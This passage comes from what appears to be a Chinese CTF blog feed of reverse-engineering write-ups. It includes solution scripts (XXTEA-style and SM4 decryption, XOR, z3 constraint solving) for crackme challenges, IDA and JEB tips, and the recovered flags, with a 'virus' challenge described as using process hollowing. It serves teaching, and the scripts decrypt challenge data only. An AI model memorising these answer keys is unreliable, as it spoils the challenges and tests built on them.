class="number">0x00000070</span>, <span class="number">0x00000076</span>, <span class="number">0x00000032</span>]</span><br><span class="line">flag=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz123456&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    print(enc.index(<span class="built_in">ord</span>(i)),end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="comment">#index=[0,6,17,27,18,7,1,8,19,28,20,9,2,10,21,29,22,11,3,12,23,30,24,13,4,14,25,31,26,15,5,16]</span></span><br></pre></td></tr></table></figure><p>解题脚本。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> enc[<span class="number">32</span>] = &#123;</span><br><span class="line">     <span class="number">0xBF8ED8A5</span>, <span class="number">0xE115A9F9</span>, <span class="number">0xFCD3F08A</span>, <span class="number">0x8BBF8946</span>, <span class="number">0xC308B162</span>, <span class="number">0x2B19CF29</span>, <span class="number">0x7A770656</span>, <span class="number">0xA4BAE4BA</span>, </span><br><span class="line">    <span class="number">0x4E3E8CE4</span>, <span class="number">0x01A7E1D9</span>, <span class="number">0x75E9CE04</span>, <span class="number">0x22B593B9</span>, <span class="number">0x497742B4</span>, <span class="number">0x24EB15F6</span>, <span class="number">0xF2C2FF0E</span>, <span class="number">0x47973039</span>, </span><br><span class="line">    <span class="number">0xC801CA0D</span>, <span class="number">0x6A125861</span>, <span class="number">0x80320BE8</span>, <span class="number">0x0385BD47</span>, <span class="number">0x69F96DDD</span>, <span class="number">0xE56490D1</span>, <span class="number">0x2D3CAD4B</span>, <span class="number">0x2D4200BE</span>, </span><br><span class="line">    <span class="number">0x89EF6979</span>, <span class="number">0x4A91885D</span>, <span class="number">0x019DEBC7</span>, <span class="number">0x3BF8FD96</span>, <span class="number">0x1BDD2557</span>, <span class="number">0xB8685FDD</span>, <span class="number">0x57226614</span>, <span class="number">0x9F585C28</span>&#125;;</span><br><span class="line"><span class="comment">//abcdefghijklmnopqrstuvwxyz123456 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *code ,<span class="keyword">unsigned</span> <span class="keyword">int</span> *key ,<span class="keyword">unsigned</span> <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> next,end,sum;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> rounds,e,delta=<span class="number">0x44336730</span>+<span class="number">77</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    rounds=<span class="number">6</span>+<span class="number">52</span>/n;</span><br><span class="line">    sum=rounds*delta;    </span><br><span class="line">    next=code[<span class="number">0</span>];<span class="comment">//设置next为code的第一个 </span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        e=(sum&gt;&gt;<span class="number">2</span>)&amp;<span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=n<span class="number">-1</span>;i&gt;<span class="number">0</span>;i--)<span class="comment">//解密最后一个到第二个</span></span><br><span class="line">        &#123;</span><br><span class="line">            end=code[i<span class="number">-1</span>];</span><br><span class="line">            code[i]-=(( (end&gt;&gt;<span class="number">5</span>^next&lt;&lt;<span class="number">2</span>)  + (next&gt;&gt;<span class="number">3</span>^end&lt;&lt;<span class="number">4</span>) ) ^ ( (sum^next) + (key[(i&amp;<span class="number">3</span>)^e]^end) ));</span><br><span class="line">            next=code[i];</span><br><span class="line">        &#125;</span><br><span class="line">        end=code[n<span class="number">-1</span>];</span><br><span class="line">        code[<span class="number">0</span>]-=(( (end&gt;&gt;<span class="number">5</span>^next&lt;&lt;<span class="number">2</span>) + (next&gt;&gt;<span class="number">3</span>^end&lt;&lt;<span class="number">4</span>) ) ^ ( (sum^next) +(key[i&amp;<span class="number">3</span>^e]^end) ));</span><br><span class="line">        next=code[<span class="number">0</span>];</span><br><span class="line">        sum-=delta;</span><br><span class="line">    &#125;<span class="keyword">while</span>(--rounds);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>]=&#123; <span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;3&#x27;</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> n=<span class="number">32</span>;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">int</span> index[<span class="number">32</span>]=&#123;<span class="number">0</span>,<span class="number">6</span>,<span class="number">17</span>,<span class="number">27</span>,<span class="number">18</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">19</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">10</span>,<span class="number">21</span>,<span class="number">29</span>,<span class="number">22</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">23</span>,<span class="number">30</span>,<span class="number">24</span>,<span class="number">13</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">25</span>,<span class="number">31</span>,<span class="number">26</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">16</span>&#125;; </span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    decrypt(enc,key,n);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    flag[i]=enc[index[i]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">31</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">&#123;</span><br><span class="line">flag[i]^=flag[(i+<span class="number">1</span>)%<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,flag);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Th4_1mp0rtant_th2n9_is_t0_le@rn!</span></span><br></pre></td></tr></table></figure><h2 id="virus"><a href="#virus" class="headerlink" title="virus"></a>virus</h2><p>考点：傀儡进程(pe映像切换)，双线程异或，12宫密码部分矩阵加密，sm4。</p><p>ida打开，发现先是读取了一个资源，然后进行异或解密，后面就是傀儡进程的代码了，所以实际上，我们需要分析的是这个资源文件。</p><p>两种方法提取文件，ida动调dump出来，resource hacker软件提取出来，然后解密，得到flag.exe。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   FILE *p;</span><br><span class="line">    <span class="keyword">char</span> v[<span class="number">0x3104d</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    p=fopen(<span class="string">&quot;LOCALIZATION.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    fread(&amp;v, <span class="number">1</span>, <span class="number">0x3104d</span>, p);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">0x3104d</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v[i]=v[i]^<span class="number">65</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    FILE *p1 = fopen(<span class="string">&quot;flag.exe&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    fwrite(&amp;v, <span class="number">1</span>, <span class="number">0x3104d</span>, p1);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>分析flag.exe<br><img src="https://i.loli.net/2021/11/30/IpU4HbSO7tXoD8P.png"><br>所以关键就是分析sm4的key是如何生成的，其实这个算法，是本人在一次ctf中遇到了一个12宫密码的题，当时觉得里面一个矩阵的变换比较有意思，然后就用代码实现了其中的一小部分。</p><p>视频：<a href="https://www.bilibili.com/video/BV1Ra411F7tv/?spm_id_from=333.788.recommend_more_video.-1">https://www.bilibili.com/video/BV1Ra411F7tv/?spm_id_from=333.788.recommend_more_video.-1</a>里面7分钟左右的部分。</p><p>我看了各位师傅的wp后，发现很大一部分都是用的爆破，也在预期之内，因为4个字节确实可以爆破，但实际上这个算法的加密就是解密，可以实验一下，多循环几次，就可以得到我们输入的内容，最终可以得到初始key为’_shy’。</p><p>所以解题就比较简单了。得到sm4的key，然后用python库，或者直接网站解，或者直接，把密文反着弄，然后用exe中的sm4部分跑一下，都可解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> sm4</span><br><span class="line"></span><br><span class="line">key = sm4.SM4Key(<span class="built_in">bytes</span>.fromhex(<span class="string">&quot;68677f4e555b4e777b65785b4c726f6f&quot;</span>))</span><br><span class="line">s =key.decrypt(<span class="built_in">bytes</span>.fromhex(<span class="string">&quot;5C89EEF56FC54492DBE3AE9CB54F4AF4E7A35E0FFC93FC766CFB29E0162FA567&quot;</span>))</span><br><span class="line"></span><br><span class="line">x=[<span class="number">6</span>,<span class="number">7</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    print(<span class="built_in">chr</span>(s[i]^x[i%<span class="number">2</span>]),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#Ho3_I_Exp3cTed_n0_pY_1n_the_Ctf!</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 出题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 Geek and HECTF re wp</title>
      <link href="2021/11/16/2021%20Geek%20and%20HECTF%20re/"/>
      <url>2021/11/16/2021%20Geek%20and%20HECTF%20re/</url>
      
        <content type="html"><![CDATA[<h1 id="2021-Geek-and-HECTF-re-wp"><a href="#2021-Geek-and-HECTF-re-wp" class="headerlink" title="2021 Geek and HECTF re wp#"></a>2021 Geek and HECTF re wp#</h1><p>最近比赛超多，有点顶不住了，湖湘杯的题质量还是很好的，值得花时间去复现，就是py太多了，也不知道有些队伍没wp都敢交flag是怎么想的，掉钱眼子里面去了。</p><p>本文章记录一个月的极客大挑战，和2两天的HECTF。</p><h1 id="2021-Geek-re"><a href="#2021-Geek-re" class="headerlink" title="2021 Geek re"></a>2021 Geek re</h1><p>做完了逆向，题目质量有高有低，一些适合新生，一些又不适合新生，写wp给新生看看，毕竟大家都是这么过来的。</p><h2 id="Re0"><a href="#Re0" class="headerlink" title="Re0"></a>Re0</h2><p>签到题 ida打开，shift + f12查看字符串就行。<br><code>SYC&#123;Welcome_to_Geek_challenge2021&#125;</code></p><p>顺便也将几个常用的快捷键讲讲吧</p><pre><code>f5 反编译出类似于c代码的窗口h键 10进制和16进制互换d键 将IDA view-RIP解面的单个字节进行转换，可转换为2个，3个，4个，甚至更多个字节。u键 将多个字节数据，甚至是汇编字节码进行拆分为单个字节的。c键 重新分析为汇编代码p键 重新生成函数/键 在汇编解密也可以看到f5的伪代码，方便在汇编界面调试，前提是代码能f5r键 转换为字符串类型的样子。n键 修改变量 函数名称y键 修改变量类型，使代码更加好看m键 查看一些api的参数名称还有些set ip呀，重新定义数组呀之类操作。</code></pre><p>还有些好用的ida插件也都说说。</p><pre><code>lazyida 可以快速dump出想要类型的数据，word，dword，等等。findcrypto3 可以用来查看是否有某些常见加密算法的特征值，从而快速定位到关键位置。keypatch 用来打补丁的，个人用的较少。bindiff 恢复符号表的好东西，他可以匹配代码的相似度来达到恢复符号表的功能，特别是elf文件动调时，经常遇到符号表不见了的情况，就可以使用bindiff来恢复。</code></pre><h2 id="刘壮桌面美化大师"><a href="#刘壮桌面美化大师" class="headerlink" title="刘壮桌面美化大师"></a>刘壮桌面美化大师</h2><p>好像是一个桌面控件，弄一下就可以出。但是我感觉是签到题，就直接用jeb去看了看字符串，然后就在里面。</p><p>也是一个安卓题常用到的知识点吧，就是字符一般都会在jeb左上角的这个目录下。</p><pre><code>Resource/values/strings.xml</code></pre><p>当然也可以用apktool来解包。</p><p><code>SYC&#123;We1c0m3_t0_4ndRo1d_ReV3rse!&#125;</code></p><h2 id="买Activity"><a href="#买Activity" class="headerlink" title="买Activity"></a>买Activity</h2><p>这个题，还是需要了解点安卓，好像是启动一个活动就可以得到flag，但是本人没具体搞过安卓，所以做的方式可能比较奇怪。</p><p>先是用jeb看了看decode函数，发现好像是个自解密，先从native层得到一串字符然后去异或。<br><img src="https://i.loli.net/2021/11/10/AEPF3k2Ghear7zd.png"><br>所以我们只需要得到native层的函数就行，先解压apk，分析so文件。</p><p>函数Java_com_sorrowrain_buyactivity_Decode_stringFromNative里面有两串字符串，后面一堆混淆，解题后推测应该是个栅栏自解密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">s1=<span class="string">&#x27;CSD!Os!yiyO#|iU`bu1&#x27;</span></span><br><span class="line">s2=<span class="string">&#x27;Ikxc$dFdOCBq!Oh dtm&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s1)):</span><br><span class="line">    print(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s1[i])^<span class="number">16</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s2[i]) ^ <span class="number">16</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#SYC&#123;Th1s_4ct1Vity_iS_R3al1y_Exp0rted!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Re1"><a href="#Re1" class="headerlink" title="Re1"></a>Re1</h2><p>发现就是一个base64+一个异或</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> v9[<span class="number">60</span>];</span><br><span class="line">v9[<span class="number">0</span>] = <span class="number">21</span>;</span><br><span class="line">  v9[<span class="number">1</span>] = <span class="number">113</span>;</span><br><span class="line">  v9[<span class="number">2</span>] = <span class="number">44</span>;</span><br><span class="line">  v9[<span class="number">3</span>] = <span class="number">4</span>;</span><br><span class="line">  v9[<span class="number">4</span>] = <span class="number">37</span>;</span><br><span class="line">  v9[<span class="number">5</span>] = <span class="number">113</span>;</span><br><span class="line">  v9[<span class="number">6</span>] = <span class="number">40</span>;</span><br><span class="line">  v9[<span class="number">7</span>] = <span class="number">16</span>;</span><br><span class="line">  v9[<span class="number">8</span>] = <span class="number">21</span>;</span><br><span class="line">  v9[<span class="number">9</span>] = <span class="number">44</span>;</span><br><span class="line">  v9[<span class="number">10</span>] = <span class="number">121</span>;</span><br><span class="line">  v9[<span class="number">11</span>] = <span class="number">40</span>;</span><br><span class="line">  v9[<span class="number">12</span>] = <span class="number">34</span>;</span><br><span class="line">  v9[<span class="number">13</span>] = <span class="number">45</span>;</span><br><span class="line">  v9[<span class="number">14</span>] = <span class="number">18</span>;</span><br><span class="line">  v9[<span class="number">15</span>] = <span class="number">38</span>;</span><br><span class="line">  v9[<span class="number">16</span>] = <span class="number">25</span>;</span><br><span class="line">  v9[<span class="number">17</span>] = <span class="number">45</span>;</span><br><span class="line">  v9[<span class="number">18</span>] = <span class="number">6</span>;</span><br><span class="line">  v9[<span class="number">19</span>] = <span class="number">58</span>;</span><br><span class="line">  v9[<span class="number">20</span>] = <span class="number">26</span>;</span><br><span class="line">  v9[<span class="number">21</span>] = <span class="number">20</span>;</span><br><span class="line">  v9[<span class="number">22</span>] = <span class="number">25</span>;</span><br><span class="line">  v9[<span class="number">23</span>] = <span class="number">112</span>;</span><br><span class="line">  v9[<span class="number">24</span>] = <span class="number">24</span>;</span><br><span class="line">  v9[<span class="number">25</span>] = <span class="number">114</span>;</span><br><span class="line">  v9[<span class="number">26</span>] = <span class="number">6</span>;</span><br><span class="line">  v9[<span class="number">27</span>] = <span class="number">57</span>;</span><br><span class="line">  v9[<span class="number">28</span>] = <span class="number">26</span>;</span><br><span class="line">  v9[<span class="number">29</span>] = <span class="number">22</span>;</span><br><span class="line">  v9[<span class="number">30</span>] = <span class="number">121</span>;</span><br><span class="line">  v9[<span class="number">31</span>] = <span class="number">112</span>;</span><br><span class="line">  v9[<span class="number">32</span>] = <span class="number">33</span>;</span><br><span class="line">  v9[<span class="number">33</span>] = <span class="number">7</span>;</span><br><span class="line">  v9[<span class="number">34</span>] = <span class="number">22</span>;</span><br><span class="line">  v9[<span class="number">35</span>] = <span class="number">38</span>;</span><br><span class="line">  v9[<span class="number">36</span>] = <span class="number">25</span>;</span><br><span class="line">  v9[<span class="number">37</span>] = <span class="number">45</span>;</span><br><span class="line">  v9[<span class="number">38</span>] = <span class="number">6</span>;</span><br><span class="line">  v9[<span class="number">39</span>] = <span class="number">58</span>;</span><br><span class="line">  v9[<span class="number">40</span>] = <span class="number">33</span>;</span><br><span class="line">  v9[<span class="number">41</span>] = <span class="number">24</span>;</span><br><span class="line">  v9[<span class="number">42</span>] = <span class="number">14</span>;</span><br><span class="line">  v9[<span class="number">43</span>] = <span class="number">38</span>;</span><br><span class="line">  v9[<span class="number">44</span>] = <span class="number">34</span>;</span><br><span class="line">  v9[<span class="number">45</span>] = <span class="number">114</span>;</span><br><span class="line">  v9[<span class="number">46</span>] = <span class="number">26</span>;</span><br><span class="line">  v9[<span class="number">47</span>] = <span class="number">38</span>;</span><br><span class="line">  v9[<span class="number">48</span>] = <span class="number">35</span>;</span><br><span class="line">  v9[<span class="number">49</span>] = <span class="number">45</span>;</span><br><span class="line">  v9[<span class="number">50</span>] = <span class="number">22</span>;</span><br><span class="line">  v9[<span class="number">51</span>] = <span class="number">114</span>;</span><br><span class="line">  v9[<span class="number">52</span>] = <span class="number">26</span>;</span><br><span class="line">  v9[<span class="number">53</span>] = <span class="number">24</span>;</span><br><span class="line">  v9[<span class="number">54</span>] = <span class="number">10</span>;</span><br><span class="line">  v9[<span class="number">55</span>] = <span class="number">58</span>;</span><br><span class="line">  v9[<span class="number">56</span>] = <span class="number">26</span>;</span><br><span class="line">  v9[<span class="number">57</span>] = <span class="number">24</span>;</span><br><span class="line">  v9[<span class="number">58</span>] = <span class="number">112</span>;</span><br><span class="line">  v9[<span class="number">59</span>] = <span class="number">125</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">60</span>;i++)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,v9[i]^<span class="number">0x40</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//U1lDe1hPUl9hbmRfYmFzZTY0X2FyZV90aGVfYmFzaXNfb2ZfcmV2ZXJzZX0= </span></span><br></pre></td></tr></table></figure><p>然后base64解密<br>SYC{XOR_and_base64_are_the_basis_of_reverse}</p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>考点就是ida动调elf文件，和简单的汇编识别能力，需要知道直接调一遍的流程是正确的，需要我们修改流程，而且该题也是个自解密。</p><p>但是实际上静态可以做，只需要简单改点汇编，去个花就可以看了。</p><p>正常情况我们是无法f5看完整代码的，原因如下。<br><img src="https://i.loli.net/2021/11/10/6uiHIvt7ec92VzZ.png"><br>是在11c9处u键，p键</p><p>修改后就可以看伪代码了。<br><img src="https://i.loli.net/2021/11/10/EeATfz7ZChYs89x.png"><br>flag：<code>SYC&#123;C0ngr@tuIatlOns_thls_1s_th3_r!gHt_f!ag&#125;</code></p><h2 id="珍惜生命"><a href="#珍惜生命" class="headerlink" title="珍惜生命"></a>珍惜生命</h2><p>pyc文件，利用uncompyle6还原为py代码，然后分析py代码。</p><p>简单分析后发现考点是z3约束器解方程式。</p><p>先用z3求出key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">key = [BitVec(<span class="string">&#x27;key[%d]&#x27;</span> % i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">KEY_cmp = <span class="string">&#x27;Syclover&#x27;</span></span><br><span class="line"></span><br><span class="line">key_cmp = [<span class="number">0</span>]*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">key_cmp[<span class="number">0</span>] = (key[<span class="number">1</span>] * key[<span class="number">2</span>] - key[<span class="number">5</span>] * <span class="number">72</span> - key[<span class="number">4</span>] * <span class="number">3</span> - key[<span class="number">3</span>] ^ key[<span class="number">1</span>] + (key[<span class="number">3</span>] &lt;&lt; <span class="number">2</span>) + key[<span class="number">2</span>] * <span class="number">6</span> - key[<span class="number">7</span>] &amp; key[<span class="number">6</span>] - <span class="number">1000</span>) - <span class="number">14</span></span><br><span class="line">key_cmp[<span class="number">1</span>] = (key[<span class="number">5</span>] * <span class="number">7</span> + key[<span class="number">3</span>] * <span class="number">3</span> + key[<span class="number">2</span>] + key[<span class="number">6</span>] - (key[<span class="number">2</span>] &gt;&gt; <span class="number">2</span>) - key[<span class="number">1</span>] ^ key[<span class="number">0</span>] + key[<span class="number">7</span>] + (key[<span class="number">4</span>] ^ key[<span class="number">1</span>]) + (key[<span class="number">4</span>] | key[<span class="number">7</span>])) - <span class="number">801</span></span><br><span class="line">key_cmp[<span class="number">2</span>] = (key[<span class="number">6</span>] * <span class="number">5</span> + key[<span class="number">2</span>] * <span class="number">6</span> - key[<span class="number">3</span>] * <span class="number">7</span> + key[<span class="number">4</span>] | key[<span class="number">5</span>] + key[<span class="number">4</span>] * <span class="number">10</span> + key[<span class="number">0</span>] ^ key[<span class="number">1</span>] * <span class="number">3</span> - key[<span class="number">7</span>] + key[<span class="number">0</span>] + key[<span class="number">1</span>]) - <span class="number">924</span></span><br><span class="line">key_cmp[<span class="number">3</span>] = key[<span class="number">1</span>] * <span class="number">3</span> + key[<span class="number">5</span>] * <span class="number">9</span> + key[<span class="number">0</span>] + key[<span class="number">2</span>] * <span class="number">2</span> + key[<span class="number">3</span>] * <span class="number">5</span> - key[<span class="number">4</span>] * (key[<span class="number">6</span>] ^ key[<span class="number">7</span>]) + <span class="number">321</span> - <span class="number">16</span></span><br><span class="line">key_cmp[<span class="number">4</span>] = (key[<span class="number">5</span>] * <span class="number">12</span> - key[<span class="number">0</span>] ^ key[<span class="number">6</span>] - key[<span class="number">3</span>] * <span class="number">23</span> + key[<span class="number">4</span>] * <span class="number">3</span> + key[<span class="number">2</span>] * <span class="number">8</span> + key[<span class="number">1</span>] - key[<span class="number">7</span>] * <span class="number">2</span> + key[<span class="number">6</span>] * <span class="number">4</span> + <span class="number">1324</span>) + <span class="number">1</span></span><br><span class="line">key_cmp[<span class="number">5</span>] = key[<span class="number">3</span>] * <span class="number">54</span> - key[<span class="number">1</span>] * <span class="number">3</span> + key[<span class="number">2</span>] * <span class="number">3</span> + key[<span class="number">4</span>] * <span class="number">11</span> - key[<span class="number">5</span>] * <span class="number">2</span> + key[<span class="number">0</span>] + key[<span class="number">7</span>] * <span class="number">3</span> - key[<span class="number">6</span>] - <span class="number">6298</span> + <span class="number">40</span></span><br><span class="line">key_cmp[<span class="number">6</span>] = 